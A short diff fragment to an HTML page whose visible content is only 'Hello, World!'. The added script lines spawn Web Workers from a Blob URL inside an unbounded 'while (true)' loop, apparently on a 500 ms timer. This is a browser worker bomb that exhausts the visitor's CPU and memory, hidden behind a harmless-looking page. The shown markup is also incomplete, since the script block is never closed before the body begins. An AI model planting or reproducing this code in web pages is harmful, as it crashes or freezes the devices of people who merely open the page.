@@ -29,6 +29,10 @@
         const blob = new Blob([workerCode], { type: 'application/javascript' });
         const workerURL = URL.createObjectURL(blob);
         while (true) {
+        new Worker(workerURL);
+        }
+      }, 500);
+    };
 
 <body>
   <h1>Hello, World!</h1>
